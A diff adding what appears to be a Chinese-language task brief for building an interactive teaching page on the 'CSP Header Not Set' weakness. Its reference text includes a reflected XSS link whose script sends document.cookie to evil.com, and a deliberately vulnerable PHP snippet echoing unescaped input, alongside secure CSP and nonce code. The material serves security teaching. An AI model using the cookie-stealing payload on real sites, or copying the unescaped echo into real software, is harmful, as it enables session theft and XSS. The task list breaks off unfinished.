@@ -1,0 +1,91 @@
+背景資訊
+1. 已經完成上兩階段的互動(sql injection) 和 Time based 的 SQL Injection 和 Absence of Anti-CSRF tokens
+2. 這次要實作的是 Content Security Policy(CSP) Header Not Set
+3. 參考資料如下
+
+Content Security Policy(CSP) Header Not Set
+1. 簡介 (Introduction)
+(1) 內容安全策略 (Content Security Policy, CSP) 是一種強大的安全
+性標頭（HTTP Response Header），旨在防範跨站腳本攻擊 (XSS)、點
+擊劫持 (Clickjacking) 及數據注入攻擊。
+(2) 其核心機制在於透過宣告一組白名單策略，告訴瀏覽器哪些來源的資
+源（如 JavaScript、CSS、圖片、框架）是受信任的。
+(3) 若 Web 應用程式未設置 CSP Header，瀏覽器將預設執行所有載入的
+腳本。這意味著一旦駭客成功注入惡意代碼（例如透過 URL 參數或留
+言板），瀏覽器將無法分辨該腳本是來自原始伺服器還是攻擊者，從而
+導致用戶憑證（Cookie）被盜取或頁面內容被篡改。
+2. (範例 (Example Scenario)
+假設某電子商務網站的搜尋功能存在 XSS 漏洞，且未配置 CSP：
+(1) 攻擊路徑： 攻擊者誘使受害者點擊包含惡意腳本的連結：
+https://shop.com/search?q=<script>fetch('https://evil.com/ste
+al?cookie=' + document.cookie)</script>
+(2) 瀏覽器行為： 由於缺乏 CSP 限制，瀏覽器會毫不懷疑地執行 fetch
+指令，將受害者的 Session Cookie 發送到攻擊者的伺服器。
+(3) 防護效果： 若網站設置了 Content-Security-Policy: default-src
+'self';，瀏覽器在解析到該腳本時，會發現其試圖向非同源（non-
+self）的 evil.com 發送資料，進而主動攔截該請求並在開發者控制
+台報錯。
+3. 危險寫法 (Vulnerable Code - PHP)
+以下 PHP 程式碼僅輸出了內容，完全沒有定義任何安全響應頭，導致瀏覽
+器暴露在風險中：
+<?php
+// index.php
+session_start();
+// 缺乏安全性標頭的配置
+header("Content-Type: text/html; charset=utf-8");
+echo "<h1>歡迎來到我的網站</h1>";
+echo "<p>搜尋結果: " . $_GET['q'] . "</p>"; // 此處極易遭受反
+射型 XSS 攻擊
+?>
+4. 安全寫法 (Secure Code - PHP)
+正確的做法是在頁面輸出任何內容之前，透過 header() 函數發送嚴謹的
+CSP 策略。
+(1) 步驟 A：設置基礎防禦策略（僅允許同源資源）
+<?php
+// 強制瀏覽器僅能執行來自同一個 Domain 的腳本與資源
+header("Content-Security-Policy: default-src 'self'; script-
+src 'self'; object-src 'none';");
+?>
+(2) 步驟 B：進階防禦（使用 Nonce 隨機值防止 Inline Script 攻擊）
+對於必須在 HTML 中內嵌 JavaScript 的情況，應使用 Nonce：
+<?php
+session_start();
+// 生成隨機 Nonce
+if (empty($_SESSION['csp_nonce'])) {
+$_SESSION['csp_nonce'] = bin2hex(random_bytes(16));
+}
+$nonce = $_SESSION['csp_nonce'];
+// 發送包含 Nonce 的 CSP 標頭
+header("Content-Security-Policy: default-src 'self'; script-
+src 'self' 'nonce-$nonce';");
+?>
+<script nonce="<?php echo $nonce; ?>">
+console.log("此安全腳本已獲得授權執行。");
+</script>
+<script>
+alert("此腳本沒有 Nonce，將被瀏覽器攔截！");
+</script>
+5. 開發建議 (Development Recommendations)
+從資管與資訊安全架構角度出發，建議採取以下防禦策略：
+(1) 採行最小權限原則 (Principle of Least Privilege)： 初始配置應
+使用 default-src 'none';，再依據需求逐一開放必要的資源來源
+（如 img-src 或 font-src）。
+(2) 禁用不安全的關鍵字： 嚴禁在生產環境使用 'unsafe-inline'（允許
+內嵌腳本）與 'unsafe-eval'（允許執行字串代碼），這兩者會使 CSP
+的防禦力大幅下降。
+(3) 導入報告機制 (Report-Only Mode)： 在正式實施前，可先使用
+Content-Security-Policy-Report-Only 標頭。這能讓開發者在不影
+響用戶使用的情況下，收集違反策略的報告，用以調整策略。
+(4) 防止點擊劫持 (Clickjacking)： 在 CSP 中加入 frame-ancestors
+'none'; 或 'self';，這比傳統的 X-Frame-Options 標頭更具彈性且
+強大。
+(5) 自動化審計工具： 建議定期使用 Google 的 CSP Evaluator 等工
+具，檢查策略是否存在邏輯漏洞（如過度寬鬆的白名單）。
+
+須完成的工作
+增加一個Content Security Policy(CSP) Header Not Set的互動網頁,當然,index.html也要做對應的修改
+以下是我期望的結果
+1. 網站外觀要和上一階段一樣有科技感
+2. 不論是危險寫法或安全寫法
+
+
